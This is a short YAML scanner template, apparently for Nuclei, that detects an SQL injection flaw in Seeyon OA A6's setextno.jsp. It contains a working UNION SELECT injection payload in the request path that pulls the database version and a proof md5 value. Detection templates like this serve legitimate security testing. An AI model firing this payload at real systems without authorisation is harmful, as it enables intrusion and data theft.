id: poc-yaml-seeyon-setextno-jsp-sql
info:
  name: Seeyon OA A6 setextno.jsp SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: sql-injection
  description: |
    This template detects an SQL injection vulnerability in Seeyon OA A6's setextno.jsp.
variables:
  rand: "{{rand_int(10000, 21000)}}"
http:
  - method: GET
    path:
      - "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20union%20all%20select%201,2,@@version,md5({{rand}})%23"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{md5(rand)}}"
        part: body
